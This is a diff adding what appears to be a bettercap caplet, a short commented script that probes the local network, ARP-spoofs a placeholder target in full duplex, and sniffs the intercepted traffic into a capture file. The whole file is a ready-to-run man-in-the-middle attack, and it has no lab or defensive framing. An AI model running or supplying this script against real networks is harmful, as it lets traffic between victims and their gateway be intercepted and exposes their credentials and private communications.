@@ -1,0 +1,23 @@
+# Enable network probing
+net.probe on
+
+# Enable network reconnaissance
+net.recon on
+
+# Enable full-duplex ARP spoofing
+set arp.spoof.fullduplex true
+
+# Set the target IP for ARP spoofing
+set arp.spoof.targets [Target IP]
+
+# Enable ARP spoofing
+arp.spoof on
+
+# Enable local packet sniffing
+set net.sniff.local true
+
+# Set the output file for captured packets
+set net.sniff.output /path/to/your/capture/file.cap
+
+# Enable packet sniffing
+net.sniff on
